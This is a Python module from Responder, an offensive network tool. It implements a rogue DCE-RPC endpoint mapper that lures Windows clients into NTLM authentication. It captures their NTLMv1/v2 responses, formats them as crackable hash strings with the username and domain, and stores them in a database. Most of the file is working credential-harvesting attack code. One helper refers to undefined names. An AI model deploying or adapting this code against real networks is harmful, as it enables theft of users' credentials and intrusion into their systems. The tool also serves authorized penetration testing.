#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from responder.src.utils import *
from responder.src import settings
import struct
import re
import ssl
import codecs

if settings.Config.PY2OR3 == "PY3":
    from socketserver import BaseRequestHandler
else:
    from SocketServer import BaseRequestHandler

from responder.src.packets import (
    RPCMapBindAckAcceptedAns,
    RPCMapBindMapperAns,
    RPCHeader,
    NTLMChallenge,
    RPCNTLMNego,
)

NDR = "\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60"  # v2
Map = "\x33\x05\x71\x71\xba\xbe\x37\x49\x83\x19\xb5\xdb\xef\x9c\xcc\x36"  # v1
MapBind = "\x08\x83\xaf\xe1\x1f\x5d\xc9\x11\x91\xa4\x08\x00\x2b\x14\xa0\xfa"

# for mapper
DSRUAPI = "\x35\x42\x51\xe3\x06\x4b\xd1\x11\xab\x04\x00\xc0\x4f\xc2\xdc\xd2"  # v4
LSARPC = "\x78\x57\x34\x12\x34\x12\xcd\xab\xef\x00\x01\x23\x45\x67\x89\xab"  # v0
NETLOGON = "\x78\x56\x34\x12\x34\x12\xcd\xab\xef\x00\x01\x23\x45\x67\xcf\xfb"  # v1
WINSPOOL = "\x96\x3f\xf0\x76\xfd\xcd\xfc\x44\xa2\x2c\x64\x95\x0a\x00\x12\x09"  # v1


def Chose3264x(packet):
    if Map32 in packet:
        return Map32
    else:
        return Map64


def FindNTLMOpcode(data):
    SSPIStart = data.find(b"NTLMSSP")
    if SSPIStart == -1:
        return False
    SSPIString = data[SSPIStart:]
    return SSPIString[8:12]


def ParseRPCHash(data, client, Challenge):  # Parse NTLMSSP v1/v2
    SSPIStart = data.find(b"NTLMSSP")
    SSPIString = data[SSPIStart:]
    LMhashLen = struct.unpack("<H", data[SSPIStart + 14 : SSPIStart + 16])[0]
    LMhashOffset = struct.unpack("<H", data[SSPIStart + 16 : SSPIStart + 18])[0]
    LMHash = SSPIString[LMhashOffset : LMhashOffset + LMhashLen]
    LMHash = codecs.encode(LMHash, "hex").upper().decode("latin-1")
    NthashLen = struct.unpack("<H", data[SSPIStart + 20 : SSPIStart + 22])[0]
    NthashOffset = struct.unpack("<H", data[SSPIStart + 24 : SSPIStart + 26])[0]

    if NthashLen == 24:
        SMBHash = SSPIString[NthashOffset : NthashOffset + NthashLen]
        SMBHash = codecs.encode(SMBHash, "hex").upper().decode("latin-1")
        DomainLen = struct.unpack("<H", SSPIString[30:32])[0]
        DomainOffset = struct.unpack("<H", SSPIString[32:34])[0]
        Domain = SSPIString[DomainOffset : DomainOffset + DomainLen].decode("UTF-16LE")
        UserLen = struct.unpack("<H", SSPIString[38:40])[0]
        UserOffset = struct.unpack("<H", SSPIString[40:42])[0]
        Username = SSPIString[UserOffset : UserOffset + UserLen].decode("UTF-16LE")
        WriteHash = "%s::%s:%s:%s:%s" % (
            Username,
            Domain,
            LMHash,
            SMBHash,
            codecs.encode(Challenge, "hex").decode("latin-1"),
        )

        SaveToDb(
            {
                "module": "DCE-RPC",
                "type": "NTLMv1-SSP",
                "client": client,
                "user": Domain + "\\" + Username,
                "hash": SMBHash,
                "fullhash": WriteHash,
            }
        )

    if NthashLen > 60:
        SMBHash = SSPIString[NthashOffset : NthashOffset + NthashLen]
        SMBHash = codecs.encode(SMBHash, "hex").upper().decode("latin-1")
        DomainLen = struct.unpack("<H", SSPIString[30:32])[0]
        DomainOffset = struct.unpack("<H", SSPIString[32:34])[0]
        Domain = SSPIString[DomainOffset : DomainOffset + DomainLen].decode("UTF-16LE")
        UserLen = struct.unpack("<H", SSPIString[38:40])[0]
        UserOffset = struct.unpack("<H", SSPIString[40:42])[0]
        Username = SSPIString[UserOffset : UserOffset + UserLen].decode("UTF-16LE")
        WriteHash = "%s::%s:%s:%s:%s" % (
            Username,
            Domain,
            codecs.encode(Challenge, "hex").decode("latin-1"),
            SMBHash[:32],
            SMBHash[32:],
        )

        SaveToDb(
            {
                "module": "DCE-RPC",
                "type": "NTLMv2-SSP",
                "client": client,
                "user": Domain + "\\" + Username,
                "hash": SMBHash,
                "fullhash": WriteHash,
            }
        )


class RPCMap(BaseRequestHandler):
    def handle(self):
        try:
            data = self.request.recv(1024)
            self.request.settimeout(5)
            Challenge = RandomChallenge()
            if data[0:3] == b"\x05\x00\x0b":  # Bind Req.
                # More recent windows version can and will bind on port 135...Let's grab it.
                if FindNTLMOpcode(data) == b"\x01\x00\x00\x00":
                    n = NTLMChallenge(
                        NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge)
                    )
                    n.calculate()
                    RPC = RPCNTLMNego(Data=n)
                    RPC.calculate()
                    self.request.send(NetworkSendBufferPython2or3(str(RPC)))
                    data = self.request.recv(1024)

                    if FindNTLMOpcode(data) == b"\x03\x00\x00\x00":
                        ParseRPCHash(data, self.client_address[0], Challenge)
                        self.request.close()

                if (
                    NetworkSendBufferPython2or3(Map) in data
                ):  # Let's redirect to Mapper.
                    RPC = RPCMapBindAckAcceptedAns(
                        CTX1UID=Map,
                        CTX1UIDVersion="\x01\x00\x00\x00",
                        CallID=NetworkRecvBufferPython2or3(data[12:16]),
                    )

                if (
                    NetworkSendBufferPython2or3(NDR) in data
                    and NetworkSendBufferPython2or3(Map) not in data
                ):  # Let's redirect to Mapper.
                    RPC = RPCMapBindAckAcceptedAns(
                        CTX1UID=NDR,
                        CTX1UIDVersion="\x02\x00\x00\x00",
                        CallID=NetworkRecvBufferPython2or3(data[12:16]),
                    )

                RPC.calculate()
                self.request.send(NetworkSendBufferPython2or3(str(RPC)))
                data = self.request.recv(1024)

            if data[0:3] == b"\x05\x00\x00":  # Mapper Response.

                # DSRUAPI
                if NetworkSendBufferPython2or3(DSRUAPI) in data:
                    x = RPCMapBindMapperAns()
                    x.calculate()
                    RPC = RPCHeader(
                        Data=x, CallID=NetworkRecvBufferPython2or3(data[12:16])
                    )
                    RPC.calculate()
                    self.request.send(NetworkSendBufferPython2or3(str(RPC)))
                    data = self.request.recv(1024)
                    print(
                        color(
                            "[*] [DCE-RPC Mapper] Redirected %-15s to DSRUAPI auth server."
                            % (self.client_address[0].replace("::ffff:", "")),
                            3,
                            1,
                        )
                    )
                    self.request.close()

                # LSARPC
                if NetworkSendBufferPython2or3(LSARPC) in data:
                    x = RPCMapBindMapperAns(
                        Tower1UID=LSARPC,
                        Tower1Version="\x00\x00",
                        Tower2UID=NDR,
                        Tower2Version="\x02\x00",
                    )
                    x.calculate()
                    RPC = RPCHeader(
                        Data=x, CallID=NetworkRecvBufferPython2or3(data[12:16])
                    )
                    RPC.calculate()
                    self.request.send(NetworkSendBufferPython2or3(str(RPC)))
                    data = self.request.recv(1024)
                    print(
                        color(
                            "[*] [DCE-RPC Mapper] Redirected %-15s to LSARPC auth server."
                            % (self.client_address[0].replace("::ffff:", "")),
                            3,
                            1,
                        )
                    )
                    self.request.close()

                # WINSPOOL
                if NetworkSendBufferPython2or3(WINSPOOL) in data:
                    x = RPCMapBindMapperAns(
                        Tower1UID=WINSPOOL,
                        Tower1Version="\x01\x00",
                        Tower2UID=NDR,
                        Tower2Version="\x02\x00",
                    )
                    x.calculate()
                    RPC = RPCHeader(
                        Data=x, CallID=NetworkRecvBufferPython2or3(data[12:16])
                    )
                    RPC.calculate()
                    self.request.send(NetworkSendBufferPython2or3(str(RPC)))
                    data = self.request.recv(1024)
                    print(
                        color(
                            "[*] [DCE-RPC Mapper] Redirected %-15s to WINSPOOL auth server."
                            % (self.client_address[0].replace("::ffff:", "")),
                            3,
                            1,
                        )
                    )
                    self.request.close()

                # NetLogon
                if NetworkSendBufferPython2or3(NETLOGON) in data:
                    self.request.close()
                    # For now, we don't want to establish a secure channel... we want NTLM.

                    # x = RPCMapBindMapperAns(Tower1UID=NETLOGON,Tower1Version="\x01\x00",Tower2UID=NDR,Tower2Version="\x02\x00")
                    # x.calculate()
                    # RPC =  RPCHeader(Data = x, CallID=NetworkRecvBufferPython2or3(data[12:16]))
                    # RPC.calculate()
                    # self.request.send(NetworkSendBufferPython2or3(str(RPC)))
                    # data = self.request.recv(1024)
                    # print(color("[*] [DCE-RPC Mapper] Redirected %-15s to NETLOGON auth server." % (self.client_address[0]), 3, 1))

        except Exception:
            self.request.close()
            pass


class RPCMapper(BaseRequestHandler):
    def handle(self):
        try:
            data = self.request.recv(2048)
            self.request.settimeout(3)
            Challenge = RandomChallenge()

            if FindNTLMOpcode(data) == b"\x01\x00\x00\x00":
                n = NTLMChallenge(
                    NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge)
                )
                n.calculate()
                RPC = RPCNTLMNego(Data=n)
                RPC.calculate()
                self.request.send(NetworkSendBufferPython2or3(str(RPC)))
                data = self.request.recv(1024)

            if FindNTLMOpcode(data) == b"\x03\x00\x00\x00":
                ParseRPCHash(data, self.client_address[0], Challenge)
                self.request.close()

        except Exception:
            self.request.close()
            pass
